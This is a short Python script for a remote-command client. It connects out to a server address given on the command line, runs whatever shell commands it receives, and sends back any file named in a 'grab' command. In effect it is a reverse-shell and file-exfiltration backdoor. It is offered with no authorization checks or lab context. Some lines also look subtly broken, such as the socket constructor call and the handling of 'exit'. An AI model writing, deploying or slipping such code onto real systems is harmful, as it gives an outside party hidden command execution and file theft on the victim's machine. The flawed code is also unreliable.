import socket
import subprocess
import logging
import os
import argparse
import sys

# Configure logging
logging.basicConfig(level=logging.INFO)

def transfer(client, file_name):
    """Transfer a file to the client."""
    try:
        if os.path.exists(file_name):
            with open(file_name, "rb") as file:
                while True:
                    bits = file.read(1024)
                    if not bits:
                        break
                    client.send(bits)
            client.send(b"DONE")
        else:
            client.send(b"Unable to find the file")
    except Exception as e:
        logging.error("Error occurred during file transfer: {}".format(e))

def execute_command(client, command):
    """Execute a shell command and send the output to the client."""
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        client.send(result.stdout.encode())
        client.send(result.stderr.encode())
    except Exception as e:
        logging.error("Error occurred while executing command: {}".format(e))

def handle_command(client, command):
    """Handle incoming commands from the server."""
    command_parts = command.decode().split()
    if not command_parts:
        return
    
    if command_parts[0] == "grab":
        if len(command_parts) > 1:
            transfer(client, command_parts[1])
        else:
            client.send(b"File name not specified.")
    elif command_parts[0] == "exit":
        client.close()
    else:
        execute_command(client, command_parts)

def connect(server_ip, server_port):
    """Establish a connection to the server and listen for commands."""
    with socket.socket(socket.SOCK_STREAM) as client:
        try:
            client.connect((server_ip, server_port))
            logging.info("Connected to {}:{}".format(server_ip, server_port))
            while True:
                try:
                    command = client.recv(1024)
                    if not command:
                        break
                    handle_command(client, command)
                except Exception as e:
                    logging.error("Error occurred while handling command: {}".format(e))
        except KeyboardInterrupt:
            logging.info("Interrupted by user")
            sys.exit()
        except Exception as e:
            logging.error("Connection error: {}".format(e))

def main():
    """Main entry point of the script."""
    parser = argparse.ArgumentParser(description="Client for a simple remote command execution server.")
    parser.add_argument('server_ip', type=str, help="The server's IP address.")
    parser.add_argument('server_port', type=int, help="The server's port number.")

    args = parser.parse_args()
    connect(args.server_ip, args.server_port)

if __name__ == "__main__":
    main()
